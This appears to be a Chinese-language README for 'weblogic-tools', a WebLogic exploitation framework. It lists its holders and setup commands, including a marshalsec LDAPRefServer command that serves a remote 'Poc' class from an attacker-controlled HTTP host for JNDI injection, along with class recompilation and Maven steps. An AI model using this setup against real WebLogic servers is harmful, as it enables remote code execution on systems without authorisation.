# weblogic-tools
weblogic-tools

拥有人员名单：

| id | 版本  | 时间 |
|:--------|:-------|------|
|Skay|weblogic-framework-0.1.0|2020-04-19|
|sky@iiusky|weblogic-framework-0.1.0|2020-04-19|
|R3start|weblogic-framework-0.1.0|2020-04-19|
|Forever_yang|weblogic-framework-0.1.0|2020-04-19|
|l1nk3r|weblogic-framework-0.1.0|2020-04-19|
|r4v3n|weblogic-framework-0.1.0|2020-04-19|

启动 JNDI 服务

```
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://192.168.1.6:9999/#Poc 1099
```

启动 HTTP 服务

```
python -m http.server 9999
```

修改代码

```
javac -cp wlfullclient.jar -source 1.5 -target 1.5 -sourcepath weblogic -d weblogic weblogic/iiop/IORManager.java

javac -cp wlfullclient.jar -source 1.5 -target 1.5 -sourcepath weblogic -d weblogic weblogic/corba/idl/RemoteDelegateImpl.java
```
启动 com.bea.javascript.jar
```
python -m http.server 8080
```

添加本地仓库依赖

wlfullclient_1.13.jar

```
mvn install:install-file -Dfile=wlfullclient_1.13.jar -DgroupId=com.oracle -DartifactId=weblogic -Dversion=1.13 -Dpackaging=jar

<dependency>
    <groupId>com.oracle</groupId>
    <artifactId>weblogic</artifactId>
    <version>1.13</version>
</dependency>

```

```
mvn install:install-file -Dfile=jsafeFIPS.jar -DgroupId=com.oracle -DartifactId=jsafeFIPS -Dversion=0.01 -Dpackaging=jar

<dependency>
    <groupId>com.oracle</groupId>
    <artifactId>jsafeFIPS</artifactId>
    <version>0.01</version>
</dependency>

```


## 更新日志

2020-04-04

- 取消入口为 ip + port 方式修改为 url 方式
- 修改部分实现
